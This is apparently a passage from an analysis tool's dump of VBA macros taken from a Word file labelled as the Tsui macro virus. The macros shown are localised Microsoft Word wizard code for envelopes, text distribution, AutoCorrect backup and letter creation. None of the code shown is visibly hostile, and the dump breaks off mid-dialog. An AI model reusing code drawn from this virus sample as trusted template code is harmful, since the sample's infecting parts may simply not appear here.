' --------------------------------------------------------------------------------------

Public Const strWIZ_NAME = "信封精靈"
Public Const iBALLOON_OPTIONS = 2 ' Number of items in InitialBalloon (First=1)
Public Const strBALLOON_HEADING = "歡迎使用信封精靈。"
Public Const strOPTION_ONE_ACCELERATOR = "C"   'This is the form accelerator for strInitialBalloon(0)
Public Const strOPTION_TWO_ACCELERATOR = "e"   'This is the form accelerator for strInitialBalloon(1)
Public strInitialBalloon(iBALLOON_OPTIONS) As String
Public strHelpTip(iBALLOON_OPTIONS) As String

Public Sub InitWizardStrings()
  
' NOTE: change constant  iBALLOON_OPTIONS if number of items in list changes
    ' Balloon / Form menu options
    strInitialBalloon(0) = "建立一信封"
    strInitialBalloon(1) = "建立郵寄清單中的所有信封"

    ' Assistant help messages
strHelpTip(0) = "請鍵入信封上寄件人及收件人的地址。或者是從 Microsoft Outlook 連絡人或 Microsoft Exchange 個人通訊錄中按一下「通訊錄」按鈕使用其中的名單。當您鍵入地址之後請按「列印」。"
strHelpTip(1) = "您可以使用合併列印的功能來建立信封。假如您需要幫忙，那麼在合併列印對話方塊頂端的說明將會引導您完成總共有三步驟的程序。"

End Sub  ' InitWizardStrings

Public Function fnInitialBalloon(iBtn)
    
    'On Error GoTo ErrorInitBalloon
    
    Select Case iBtn
        Case Is < 1 'Exit
            ActiveDocument.Close wdDoNotSaveChanges
        Case 1 ' Open the envelope dialog
            If fAssistantAvailable Then ShowAssistantTip
            Application.Dialogs(wdDialogToolsCreateEnvelope).Show
            If fAssistantAvailable Then objHelpTipBalloon.Close
        Case 2 ' Start a Mail Merge to envelopes
            ActiveDocument.MailMerge.MainDocumentType = wdEnvelopes
            If fAssistantAvailable Then ShowAssistantTip
            Application.Dialogs(wdDialogMailMergeHelper).Show
            If fAssistantAvailable Then objHelpTipBalloon.Close
    End Select
    Exit Function
    
End Function ' fnInitialBalloon

' End Envelope Wizard Module
Private Const SZ_MACRONAME = "文字均等分"
Global iPrevChars As Integer

Sub Insert()
    Dim n As Integer
    Dim para As Paragraph
    Dim fld As Field
    
    On Error GoTo LError
    
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    n = 2
    With Selection
        If ((Selection.Start = Selection.End) And (.Text = Chr$(21))) Then
            .MoveRight , 1, 1
        End If
        
        For Each fld In .Fields
            a$ = fld.Code
            If (FIsDistField(a$)) Then
                iTop = InStr(1, a$, ",")
                iEnd = InStr(1, a$, ")") - 1
                n = iEnd - iTop
                dlgDist.ID_RESET.Enabled = True
                GoTo LSkip
            ElseIf (InStr(1, a$, "eq") <> 0) Then
                MsgBox "此字串未均等分", Title:=SZ_MACRONAME
                GoTo LExit:
            End If
        Next fld
        dlgDist.ID_RESET.Enabled = False
        If (Len(Selection.Text) < 2) Then
            MsgBox "請選取要均等分的字串，且字串要有兩個字以上。", Title:=SZ_MACRONAME
            GoTo LExit
        ElseIf (Len(Selection.Text) = 2) And _
                (Right(Selection.Text, 1) = Chr$(13)) Then
                MsgBox "換行符號、定位點及功能變數都不算是一個字，請重新選擇要均等分的字串。", Title:=SZ_MACRONAME
                GoTo LExit
        ElseIf (Len(Selection.Text) = 2) And _
                (Right(Selection.Text, 1) = Chr$(9)) Then
                MsgBox "換行符號、定位點及功能變數都不算是一個字，請重新選擇要均等分的字串。", Title:=SZ_MACRONAME
                GoTo LExit
        End If
        If (InStr(1, Selection.Text, Chr$(13)) <> 0) Then
            For Each para In .Paragraphs
                If (n < (Len(para.Range.Text) - 1)) Then
                    n = Len(para.Range.Text) - 1
                End If
            Next para
        Else
            n = Len(Selection.Text)
        End If
        If (n < iPrevChars) Then
            n = iPrevChars
        End If
    End With

LSkip:
    If (n > 32) Then
        n = 32
    ElseIf (n < 1) Then
        n = 1
    End If
    dlgDist.IDCS_SIZE.Value = n
    dlgDist.IDCE_SIZE.Text = n
    dlgDist.IDCE_SIZE.IMEMode = fmIMEModeNoControl
    dlgDist.IDCE_SIZE.SetFocus
    dlgDist.IDCE_SIZE.SelStart = 0
    dlgDist.IDCE_SIZE.SelLength = 99
    
    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    
    dlgDist.Show

LExit:
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

Sub Create(n As Integer)
    Dim rgn As Range
    Dim rgnTmp As Range
    Dim rgnOrg As Range
    Dim para As Paragraph
    Dim cmdb As CommandBar
    
    On Error GoTo LError
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    
    With Selection
        Set rgnOrg = .Range
        For Each para In rgnOrg.Paragraphs
            If (InStr(1, rgnOrg.Text, Chr$(13)) <> 0) Then
                Set rgn = para.Range
                If (para.Range.Start < rgnOrg.Start) Then
                    rgn.SetRange rgnOrg.Start, rgn.End - 1
                ElseIf (para.Range.End > rgnOrg.End) Then
                    rgn.SetRange rgn.Start, rgnOrg.End - 1
                Else
                    rgn.SetRange rgn.Start, rgn.End - 1
                End If
                rgn.Select
            Else
                Set rgn = rgnOrg
            End If
            cLineBreak = InStr(1, rgn.Text, Chr$(11))
            If (cLineBreak <> 0) Then
                rgn.SetRange rgn.Start, rgn.Start + cLineBreak - 1
                rgn.Select
            End If
            If (.Fields.Count > 0) Then
                a$ = .Fields(1).Code
                If (FIsDistField(a$) = True) Then
                    Resize .Fields(1), n
                    GoTo LContinue
                End If
            End If
            
            c = Len(.Text)
            ' Remove Additional Spaces
            sz$ = .Text
            x = 0
            While (FIsSpace(Right$(sz$, 1)) <> 0)
                sz$ = Left$(sz$, Len(sz$) - 1)
                x = x + 1
            Wend
            
            ' Create DistChar field
            ' {eq \o\ad(foo,     )}
            Set rgn = .Range
            If (x > 0) Then
                .MoveRight
                .MoveLeft unit:=wdCharacter, Count:=x
                .Delete unit:=wdCharacter, Count:=x
                rgn.Select
            End If
            .InsertAfter "," + String$(n, "　") + ")"
            .InsertBefore "eq \o\ad("
            rgn.SetRange rgn.Start + Len("eq \o\ad("), rgn.End
            rgn.Font.DisableCharacterSpaceGrid = False
            Set rgn = .Range
           ' Insert Field
            .Fields.Add .Range, , , False
            ' { eq \o\ad(foo,     ) }
            '                      ~ Remove tip space
            rgn.Select
            rgn.SetRange .Range.End - 2, .Range.End - 1
            rgn.Text = ""
            
            .Fields.ToggleShowCodes
            .MoveRight , 1, 1
LContinue:
        Next para
    End With
    rgnOrg.Select
    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub

' *************************************
Function FIsSpace(wh$)
    ch = AscW(wh$)
    ' Space DBSpace EmSpace EnSpace 1/4EmSpace
    If ch = 32 Or ch = 12288 Or ch = 8197 Or ch = 8194 Or ch = 8195 Then
        FIsSpace = ch
    Else
        FIsSpace = 0
    End If
End Function


Sub Delete()
    Dim rgn As Range
    Dim rgnFld As Range
    Dim rgnNew As Range
    Dim fld As Field
    Dim FUpdate As Boolean
    
    On Error GoTo LError
    If (Application.ScreenUpdating = True) Then
        FUpdate = True
        Application.ScreenUpdating = False
        System.Cursor = wdCursorWait
    Else
        FUpdate = False
    End If
    
    With Selection
        Set rgn = .Range
        
        If (.Fields.Count < 1) Then
'            Create (Len(.Text) + 1)
            Beep
            GoTo LExit:
        End If
        For Each fld In rgn.Fields
            a$ = fld.Code
            Set rgnFld = fld.Code
            If (FIsDistField(rgnFld.Text) = False) Then
                GoTo LContinue:
            End If
            rgnFld.Select
            
            iTop = InStr(1, a$, "(") + rgnFld.Start
            iEnd = rgnFld.End - (Len(rgnFld.Text) - InStr(1, a$, ",　") + 1)
            rgnFld.SetRange iTop, iEnd
            
            .MoveLeft
            Set rgnNew = Selection.Range
            rgnNew.FormattedText = rgnFld.FormattedText
            rgnNew.Font.DisableCharacterSpaceGrid = True
            rgnNew.Select
            .MoveRight
            .MoveRight , 1, 1
            .Delete
LContinue:
        Next fld
        rgn.Select
    End With
LExit:
    If (FUpdate = True) Then
        Application.ScreenUpdating = True
        System.Cursor = wdCursorNormal
    End If
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub


Sub Resize(fld As Field, iNew As Integer)
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    On Error GoTo LError
    With Selection
        Dim rgn As Range
        a$ = fld.Code
        Set rgn = fld.Code
        
        iTop = rgn.End - (Len(a$) - InStr(1, a$, ",　"))
        iEnd = rgn.End - (Len(a$) - InStr(1, a$, ")") + 1)
        rgn.SetRange iTop, iEnd
        rgn.Text = String$(iNew, "　")
    End With
LExit:
    Application.ScreenUpdating = True
    System.Cursor = wdCursorNormal
    Exit Sub
LError:
    MsgBox Err.Description, Title:=SZ_MACRONAME
End Sub


Function FIsDistField(szFld As String) As Boolean
    FIsDistField = False
    ' { eq \o\ad(foo,　　　)}
    '   ~~~~~~~~~        ~~~
    If (Left$(szFld, 10) = " eq \o\ad(") And (Right$(szFld, 2) = "　)") Then
        FIsDistField = True
    End If
End Function






-------------------------------------------------------------------------------
VBA MACRO UF01.frm 
in file: Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4 - OLE stream: 'Macros/VBA/UF01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 







Option Explicit

' START LOCALIZATION'
 Const StatMsg1 = "加入自動校正項目： "
 Const StatMsg2 = " 之 "
 Const StatMsg3 = "正在建立樣式..."
 Const StatMsg4 = "正在儲存..."
 Const TagText = "自動校正項目備份文件"
 Const szAppName = "自動校正工具集"
 Const szErrorMsg = "有錯誤發生。您要再試一次嗎？"
 Const szACEntriesErrorMsg = "有錯誤發生。 文件的樣式可能有問題。"
 Const szWarnMsg = "程式將從備份文件中取出儲存的自動校正項目，目前自動校正項目中相同名稱的部份將會被取代掉。您還要繼續嗎？"
 Const szFormatIncorrect = "這份文件的樣式不是正確的備份文件樣式"
 Const szRestoreCompletemsg = "已完成重新載入。"
' END LOCALIZATION'

'***********   btnBackup_Click() ******************
'
' Hides the form, creates a new Word document, calls GetAutoCorrectEntries(),
' adds the text "AutoCorrect Backup Document" at the top of the document,
' and saves the document by calling SaveACDoc.
'
' Uses valuable y that doesn't do anything.

Private Sub btnBackup_Click()
Dim Y As Integer

Autocorrect.Hide
Application.ScreenUpdating = False

'create new document
Application.Documents.Add
   
 ' call GetAutoCorrectEntries() user defined
  Y = GetAutoCorrectEntries()
  
' add Text to top of document
 With Selection
    .SplitTable
    .TypeText Text:=TagText
    .TypeParagraph
  End With
  
'add some formatting
  With ActiveDocument.Sentences(1)
    .Bold = True
    .Font.Size = 14
  End With

' Save the Document,call SaveACDoc() user defined, close if successful
Application.StatusBar = StatMsg4
If SaveACDoc = True Then
 ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
End If
Application.ScreenUpdating = True
Autocorrect.Show
End Sub

Private Sub btnClose_Click()
Autocorrect.Hide
End Sub

'************* btnRestore_Click() **************
'
' First warns the user that this will replace their existing entries.
' If they answer no it jumps to the end of the function.  Then displays
' the FileOpen dialog box to get the name of an existing AutoCorrect backup
' document (creating using the Backup button.)  Next calls OpenACDoc() to open
' the file. If successful it calls RestoreACEntries(). Finally, it closes the document.
'
'
'
Private Sub btnRestore_Click()
Dim ACFileName, Title As String
Dim Style, Response, x As Integer

Autocorrect.Hide

' warn users about replaced entries...
Style = vbYesNo + vbInformation + vbDefaultButton2 ' Define buttons.
Title = szAppName
Response = MsgBox(szWarnMsg, Style, Title)
If Response = vbNo Then
   'exit
    GoTo bye:
End If

' bring up fileopen and get a name
With Dialogs(wdDialogFileOpen)
    .Display
    ACFileName = .Name
End With

' Open a Document,call OpenACDoc() user defined
If OpenACDoc(ACFileName) = True Then 'error
    ' Restore Entries, call RestoreACEntries() user defined
    x = RestoreACEntries()
    ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
End If

bye:
Autocorrect.Show
End Sub

Function RestoreACEntries()
Dim i, NumRows As Integer
Dim oDoc, oACorrect, oTable As Object

Dim szName As String
Dim szValue As String
Dim szRTF As String

Err.Clear
On Error GoTo RestoreACEntriesErrors:

    ' check for correct format
    If ActiveDocument.Words(1) = TagText Then
        Application.ScreenUpdating = False
        
        Set oDoc = ActiveDocument
        Set oTable = oDoc.Tables(1)
        Set oACorrect = Application.Autocorrect.Entries

        NumRows = ActiveDocument.Tables(1).Rows.Count
        Selection.GoTo What:=wdGoToTable, Which:=wdGoToFirst
        Selection.MoveRight unit:=wdCell, Count:=3
    
        For i = 2 To NumRows
            szName = Selection.Text
            Selection.MoveRight unit:=wdCell
            szValue = Selection.Text
            Selection.MoveRight unit:=wdCell
            szRTF = Selection.Text
            If szRTF = "False" Then
                Application.StatusBar = StatMsg1 & szName
                oACorrect.Add Name:=szName, Value:=szValue
            Else
                Application.StatusBar = StatMsg1 & szName
                Selection.MoveLeft unit:=wdCell
                oACorrect.AddRichText szName, Selection.Range
                Selection.MoveRight unit:=wdCell
            End If
            Selection.MoveRight unit:=wdCell
        Next i
        Application.ScreenUpdating = True
        MsgBox szRestoreCompletemsg
    Else
        MsgBox szFormatIncorrect
    End If
    
    
RestoreACEntriesErrors:
Select Case Err.Number
    Case 0:
    ' no error
    Case Else
      MsgBox (szACEntriesErrorMsg & vbCr & Err.Number & "  " & Err.Description & " " & szName)
End Select
  
    
End Function

'****** GetAutoCorrectEntries() ******
'
' Inserts each AutoCorrect entry into a Word document including the Value and whether
' or not it is to include formatting.  Name is the current name of the entry,
' Value is the text value of the entry, and RTF is a Boolean that is True if the entry
' has "formatted text" checked.  Then converts the text into a table and adds a heading row to the table.
'
' x is used to loop through the AutoCorrect entries.
' TotalACEntries is the number of AC entries.

Private Function GetAutoCorrectEntries()
Dim x As Integer
Dim TotalACEntries As Integer

TotalACEntries = Application.Autocorrect.Entries.Count
For x = 1 To TotalACEntries
    With Selection
         .TypeText Text:=Application.Autocorrect.Entries.item(x).Name
         .TypeText vbTab
           
          'check for formatting and insert RTF text if necessary
          If Application.Autocorrect.Entries.item(x).RichText = True Then
               Application.Autocorrect.Entries(x).Apply Range:=Selection.Range
          Else
             .TypeText Text:=Application.Autocorrect.Entries.item(x).Value
          End If
           
          .TypeText vbTab
           .TypeText Text:=Application.Autocorrect.Entries.item(x).RichText
          .TypeParagraph
    End With
    
    'update status bar
'   Application.StatusBar = StatMsg1 & X & StatMsg2 & TotalACEntries
    Application.StatusBar = StatMsg1 & TotalACEntries & StatMsg2 & x
Next x


' convert to table
Application.StatusBar = StatMsg3
Selection.HomeKey unit:=wdStory, Extend:=wdExtend

Selection.ConvertToTable Separator:=wdSeparateByTabs, Format:=wdTableFormatSimple1, _
  ApplyBorders:=False, ApplyShading:=False, ApplyFont:=False, ApplyColor:=False, _
  ApplyHeadingRows:=False, ApplyLastRow:=False, ApplyFirstColumn:=False, ApplyLastColumn:=False, _
  AutoFit:=True

' add row heading
With Selection
    .MoveUp unit:=wdLine, Count:=1
    .InsertRows 1
    .TypeText Text:="Name"
    .MoveRight unit:=wdCell
    .TypeText Text:="Value"
    .MoveRight unit:=wdCell
    .TypeText Text:="RTF"
    .HomeKey unit:=wdStory
End With
    
 'Selection.GoTo What:=wdGoToPage, Which:=wdGoToNext
 'Selection.InsertBreak Type:=wdPageBreak
    
End Function

Public Function SaveACDoc()
Dim Style, Response As Integer
Dim Title As String

SaveACDoc = True
Err.Clear
On Error GoTo SaveACDocErrors

ActiveDocument.Save

SaveACDocErrors:
Select Case Err.Number
    Case 0:
    ' no error
    Case 4198:
    ' cancel
    SaveACDoc = False
    Case Else
      Style = vbYesNo + vbCritical + vbDefaultButton2 ' Define buttons.
      
      ' put error number and description in title of the message box
      Title = Err.Number & "  " & Err.Description
        
      Response = MsgBox(szErrorMsg, Style, Title)
      If Response = vbYes Then
          Resume 'bring up SaveAs again
      Else    ' User choose No.
          SaveACDoc = False
      End If
End Select

End Function


Public Function OpenACDoc(ByVal ACFileOpenName As String) As Boolean

Dim Style As Integer

OpenACDoc = True
Err.Clear
On Error GoTo OpenACDocErrors

Documents.Open FileName:=ACFileOpenName

OpenACDocErrors:
If Err.Number <> 0 Then
   OpenACDoc = False
End If

End Function

-------------------------------------------------------------------------------
VBA MACRO UM01.bas 
in file: Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4 - OLE stream: 'Macros/VBA/UM01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'**************************************************
' Letter Wizard
' StartWizard Macro
' %% Copyright c 1995 Microsoft Corporation
'**************************************************

'%% Universal DLL declarations
'Declare Function FindWindow Lib "user.exe"(lpClassName$, lpWinName$) As 'Integer Alias "FindWindow"
'Declare Function WinHelp Lib "user.exe"(hWnd As Integer, lpHelpFile$, 'wCommand As Integer, dwData As Long) As Integer Alias "WinHelp"
Private Declare Function FindWindow Lib "user32.dll" Alias "FindWindowA" (ByVal lpClassName$, ByVal lpWinName$) As Long
Private Declare Function WinHelp Lib "user32.dll" Alias "WinHelpA" (ByVal hwnd As Long, ByVal lpHelpFile$, ByVal wCommand As Long, ByVal dwData As Long) As Long

'%% Universal shared variables %%
Public State, LastState
Public StateItems__()
Public dlg As Object
Public HideFilePreview__()
Public wizname$
Public iWorkDoc, iEmptyDoc, workDoc$, emptyDoc$
Public HelpCtx
Public gDoogie

'%% Wizard-specific shared variables %%
Public LettersPath$        'Path to prewritten business letters (LETTERS-PATH)
Public LetterMax   'Number of letters
Public LetterNames__$() 'Names of letters
Public LetterFiles__$()    'Filenames of letters
Public defLttr     'Default category and letter
Public RetAddressLines 'DAPFEL
Public gEnvelopeLabel
Public dlgEL As Object
Public toui As Object
Public gPrewrittenFile$
Public gCurrentHeadingPosition, rtDistToLftDist
Public RetAddress__$() 'Return Address Array (max 5)
'%% Strings galore
Public kThing$, kUpThing$, kWizname$, Wizard_$, Normal_$, kGallery$
Public kErrBadDoc$, kTip$, kLetterPath$, kLettersDir$, kLongLettersDir$
Public kSetupDialog$, kCreatingDoc$, kSaveSettings$, kRstSettings$
Public kRstStylsheet$, kLookingForLetters$, kLoadingLetterDetails$, kLookingFor$, kEnterRecipientAddress$
Public chQuote$, kAddressATEntry$
Public Dot_$, Letter_$, kRE$, kAccountID$, kDear$, kRecipient$, kTypeHere$, TPath$, kName$
Public kClosePersonal$, kCloseBusiness$, kWritersInitials$, kTypistsInitials$
Public kCC$, kNames$, kEnclosures$, kNumber$, kAttachments$, kFormalDateFormat$, kPage$, kEmptyMacro$, kInsertAddress$, kMacroButton$
Public kErrLetterNotFound$, kErrThatLetterNotFound$
Public kErrStyleNotFound1$, kErrStyleNotFound2$, kErrCannotCreate1$, kErrCannotCreate2$
Public kTypeCompanyName$
Public kFntArial$, kFntWndngs$, kDfltPageNum$
Public pt90_$, pt72_$, pt216_$, kFtrDist1$, kFtrDist2$
Public kErrMaxLines$
Public cntmplet$, proflett$, eleglett$
Public kStyCmpnyName$, kStyBodyText$, kStyRetAddr$, kStyCC$, kStyEncl$, kStySigName$, kStySal$, kStySubjLine$, kStyDate$, kStyInsideAddr$, kStyRefIntls$
Public Const strERR_WIZ_NOT_FOUND   As String = "Word 在使用者範本的設定路徑裡，找不到本精靈。"
Public Const strWizShortName = "Cletter"

Rem
Rem ======== InitStrings ========
Rem Please read LocNotes before localizing!
Rem
Private Sub InitStrings()
Dim kRstStylesheet$

Rem Name of wizard & document/object produced
    kThing$ = "英文信件"
    kUpThing$ = "英文信件"
    kWizname$ = "英文信件精靈"
    WordBasic.PrintStatusBar "啟動" + kWizname$ + "..."
    Wizard_$ = kWizname$ 'Should be name as it appears in FileNew (change if different)
    Normal_$ = "normal" 'normal template
    kPage$ = "  Page "
    kName$ = "在此處輸入姓名"
    kEmptyMacro$ = "EmptyMacro "
    kGallery$ = "Gallery Example"
    kInsertAddress$ = "InsertAddress" 'Used to check if MAPI is present
    kMacroButton$ = "MACROBUTTON "
Rem Default address stored as AT Entry. used to check if user has entered an address in prewritten business letters
    kAddressATEntry$ = "Company Name" + Chr(13) + "Street Address" + Chr(13) + "City, State/Province  Zip/Postal"
    kEnterRecipientAddress$ = "  在此處輸入收件人地址 "
Rem Fonts
    kFntArial$ = "Arial"
    kFntWndngs$ = "Wingdings"
    kDfltPageNum$ = "l"
Rem Misc strings
    kErrBadDoc$ = "精靈無法使用現行文件。若要執行精靈，請選「檔案」「開新檔案」，再選取" + Wizard_$ + "。"
    kTip$ = "提示:"
    kLetterPath$ = "letters-path" 'optional .ini file setting
Rem Banter strings
    kSetupDialog$ = "正在設定對話方塊..."
    kCreatingDoc$ = "正在建立文件..."
    kSaveSettings$ = "正在儲存設定..."
    kRstSettings$ = "正在還原設定..."
    kRstStylesheet$ = "正在還原樣式..."
    kLookingForLetters$ = "正在尋找信件..."
    kLoadingLetterDetails$ = "正在載入信件細節..."
    kLookingFor$ = "尋找" '--> 'Looking for "somefile.dot"...'
    chQuote$ = Chr(34)  ' "
Rem Style strings
    kStyCmpnyName$ = "Company Name"
    kStyBodyText$ = "Body Text Keep"
    kStyRetAddr$ = "Return Address"
    kStyInsideAddr$ = "Inside Address"
    kStyCC$ = "CC"
    kStyEncl$ = "Enclosure"
    kStySigName$ = "Signature Name"
    kStySal$ = "Salutation"
    kStySubjLine$ = "Subject Line"
    kStyDate$ = "Date"
    kStyRefIntls$ = "Reference Initials"
Rem == Other strings specific to this wizard ==
    Letter_$ = "letter"  'Prefix for wizard stylesheets (eg, Letter1.dot)
    Dot_$ = ".dot"
    kRE$ = "Subject: "
    kAccountID$ = "電子郵件帳號/文件識別碼"
    kDear$ = "Dear "
    kTypeHere$ = "在此處輸入信件內容"
    kRecipient$ = "  在此處輸入收件者姓名  "
    kClosePersonal$ = "Yours truly,"
    kCloseBusiness$ = "Sincerely,"
    kWritersInitials$ = "  在此處輸入寄件者姓名縮寫  "
    kTypistsInitials$ = "  在此處輸入編繕者姓名縮寫  "
    kCC$ = "Cc: "
    kNames$ = "  在此處輸入姓名  "
    kEnclosures$ = "Enclosures: "
    kNumber$ = "  在此處輸入號碼  "
    kAttachments$ = "Attachments"
    kFormalDateFormat$ = "MMMM d, yyyy"
Rem Measurements
    pt90_$ = "90pt"
    pt72_$ = "72pt"
    pt216_$ = "216pt"
    kFtrDist1$ = "0.5"  ' Used in DoStyleMerge
    kFtrDist2$ = "0.93" ' Used in DoStyleMerge
Rem Error messages
    kErrLetterNotFound$ = "找不到預設信件。"
    kErrThatLetterNotFound$ = "找不到預設信件。請執行安裝程式並選取信件範例。" 'wizard cannot find this letter. Please choose another."
    kErrLetterNotFound$ = "找不到預設信件。"
    kErrThatLetterNotFound$ = "精靈找不到此信件，請選取其它信件。"
    kErrStyleNotFound1$ = "精靈找不到樣式範本"
    kErrStyleNotFound2$ = "。"
    kErrCannotCreate1$ = "精靈無法建立信件，因為'"
    kErrCannotCreate2$ = "' 不存在。"
    kTypeCompanyName$ = "輸入公司名稱"
    kErrMaxLines$ = "回信地址不可超過五行。"
End Sub 'InitStrings




'%% StartWizard Macro %%
Public Sub Main()
ReDim StateItems__(12)
ReDim HideFilePreview__(12)
ReDim LetterNames__$(18)
ReDim LetterFiles__$(18)
ReDim RetAddress__$(8)
Dim p$
Dim x
Dim iWindowNumber
Dim faddr As String, freaddr As String
    
State = 0
LastState = 0
Set dlg = WordBasic.DialogRecord.UserDialog(False)
wizname$ = ""
iWorkDoc = 0
iEmptyDoc = 0
workDoc$ = ""
emptyDoc$ = ""
HelpCtx = 0
gDoogie = 0
LettersPath$ = ""
LetterMax = 0
defLttr = 0
RetAddressLines = 0
gEnvelopeLabel = 0
Set dlgEL = WordBasic.DialogRecord.ToolsEnvelopesAndLabels(False)
Set toui = WordBasic.DialogRecord.ToolsOptionsUserInfo(False)
gPrewrittenFile$ = ""
gCurrentHeadingPosition = 0
rtDistToLftDist = 0
kThing$ = ""
kUpThing$ = ""
kWizname$ = ""
Wizard_$ = ""
Normal_$ = ""
kGallery$ = ""
kErrBadDoc$ = ""
kTip$ = ""
kLetterPath$ = ""
kLettersDir$ = ""
kLongLettersDir$ = ""
kSetupDialog$ = ""
kCreatingDoc$ = ""
kSaveSettings$ = ""
kRstSettings$ = ""
kRstStylsheet$ = ""
kLookingForLetters$ = ""
kLoadingLetterDetails$ = ""
kLookingFor$ = ""
kEnterRecipientAddress$ = ""
chQuote$ = ""
kAddressATEntry$ = ""
Dot_$ = ""
Letter_$ = ""
kRE$ = ""
kAccountID$ = ""
kDear$ = ""
kRecipient$ = ""
kTypeHere$ = ""
TPath$ = ""
kName$ = ""
kClosePersonal$ = ""
kCloseBusiness$ = ""
kWritersInitials$ = ""
kTypistsInitials$ = ""
kCC$ = ""
kNames$ = ""
kEnclosures$ = ""
kNumber$ = ""
kAttachments$ = ""
kFormalDateFormat$ = ""
kPage$ = ""
kEmptyMacro$ = ""
kInsertAddress$ = ""
kMacroButton$ = ""
kErrLetterNotFound$ = ""
kErrThatLetterNotFound$ = ""
kErrStyleNotFound1$ = ""
kErrStyleNotFound2$ = ""
kErrCannotCreate1$ = ""
kErrCannotCreate2$ = ""
kTypeCompanyName$ = ""
kFntArial$ = ""
kFntWndngs$ = ""
kDfltPageNum$ = ""
pt90_$ = ""
pt72_$ = ""
pt216_$ = ""
kFtrDist1$ = ""
kFtrDist2$ = ""
kErrMaxLines$ = ""
cntmplet$ = ""
proflett$ = ""
eleglett$ = ""
kStyCmpnyName$ = ""
kStyBodyText$ = ""
kStyRetAddr$ = ""
kStyCC$ = ""
kStyEncl$ = ""
kStySigName$ = ""
kStySal$ = ""
kStySubjLine$ = ""
kStyDate$ = ""
kStyInsideAddr$ = ""
kStyRefIntls$ = ""
    
    kLettersDir$ = "letters\"   'letters subdirectory - localize
    kLongLettersDir$ = "信件傳真\"
    WordBasic.WaitCursor 1  'This'll take a little while
    InitStrings
    'Get the templates directory. The templates are supposed to be in the same directory as that of the wizard
    Dim TempDlg As Object: Set TempDlg = WordBasic.DialogRecord.FileTemplates(False)
    WordBasic.CurValues.FileTemplates TempDlg
    p$ = TempDlg.Template
    If p$ = "" Then 'user might be creating a new template. Look at the default directory for style templates
        TPath$ = StrWizardPath
        If WordBasic.[Right$](TPath$, 1) <> "\" Then TPath$ = TPath$ + "\"
        If WordBasic.[Files$](TPath$ + kLongLettersDir$ + "*" + Dot_$) = "" Then
            TPath$ = TPath$ + kLettersDir$ 'short name
        Else
            TPath$ = TPath$ + kLongLettersDir$
        End If
    Else
        TPath$ = WordBasic.[FileNameInfo$](p$, 5)
    End If
    
    'TPath$ = "C:\Program Files\Microsoft Office\Templates\信件傳真\"
    Rem Names of templates for style merges
    If WordBasic.[Right$](TPath$, 1) <> "\" Then TPath$ = TPath$ + "\"
    cntmplet$ = TPath$ + "現代式信件.dot"
    If WordBasic.[Files$](cntmplet$) = "" Then cntmplet$ = TPath$ + "letter1.dot"
        
    proflett$ = TPath$ + "專業式信件.dot"
    If WordBasic.[Files$](proflett$) = "" Then proflett$ = TPath$ + "letter3.dot"
    
    eleglett$ = TPath$ + "典雅式信件.dot"
    If WordBasic.[Files$](eleglett$) = "" Then eleglett$ = TPath$ + "letter2.dot"

    rtDistToLftDist = 1.25 'Used in DateTabPlace$ in CreateLetter
    VerifyEnvirons
    GetPrewrittenDetails
    WordBasic.PrintStatusBar kSetupDialog$

    WordBasic.BeginDialog 558, 252, kWizname$, "StartWizard.DlgControl"

    'General controls, 0-7 (hands off!)
        WordBasic.Picture 2, 216, 500, 11, "LinePic", 1, "LinePicA" 'Workaround odd picture bug --
        WordBasic.Picture 130, 216, 416, 11, "LinePic", 1, "LinePicB" ' use two copies to go entire width
        WordBasic.OKButton 41, 176, 73, 21  '2 -- Will never be seen! (o.w. it'd always be default)
        WordBasic.PushButton 147, 170, 75, 20, "提示(&H)"   '3
        WordBasic.CancelButton 205, 228, 75, 19 '4
        WordBasic.PushButton 286, 228, 94, 19, "<上一步(&B)"    '5
        WordBasic.PushButton 380, 228, 94, 19, "下一步(&N)>"    '6
        WordBasic.PushButton 476, 228, 75, 19, "完成(&F)"   '7
        WordBasic.FilePreview 7, 3, 240, 206, "Preview" '8
        StateItems__(0) = 9 'Number of general (state-independent) controls

    '%% Wizard-specific states go here %%
    'State 1
        WordBasic.Text 259, 9, 229, 19, "精靈可以設計出數種型式的英文信件。"
        WordBasic.Text 269, 45, 104, 13, "您想要那一類的信件?"
        WordBasic.OptionGroup "LetterMethod"
            WordBasic.OptionButton 290, 84, 215, 16, "撰寫商業信件(&B)", "optlm2"
            WordBasic.OptionButton 290, 104, 215, 16, "撰寫私人信件(&P)", "optlm3"
        WordBasic.Text 307, 60, 208, 16, "", "Text1" 'Placeholder
        WordBasic.Text 266, 145, 40, 13, kTip$, "tip1"
        WordBasic.Text 315, 145, 208, 66, " ", "tip1text"
        ItemsInState 8  'Number of items in state
    
    'State 2: Letter options
        WordBasic.Text 262, 20, 271, 19, "您想將哪些項目加入信件中?"
        WordBasic.CheckBox 286, 50, 214, 16, "頁碼(&P)", "chkloPage"
        WordBasic.CheckBox 286, 70, 214, 16, "日期(&D)", "chkloDate"
        WordBasic.CheckBox 286, 90, 251, 16, "電子郵件帳號或文件識別碼(&I)", "chkloID"
        WordBasic.CheckBox 286, 110, 214, 16, "寫信者簽名(&W)", "chkloWriterInitials"
        WordBasic.CheckBox 286, 130, 214, 16, "打字者簽名(&T)", "chkloTypistInitials"
        WordBasic.CheckBox 286, 150, 214, 16, "副本(&C)", "chkloCC"
        WordBasic.CheckBox 286, 170, 214, 16, "隨函(&E)", "chkloEnclosures"
        WordBasic.CheckBox 286, 190, 214, 16, "附件(&A)", "chkloAttachments"
        ItemsInState 9

    'State 3
        WordBasic.Text 277, 44, 230, 18, "您要選取何種格式的信件?"
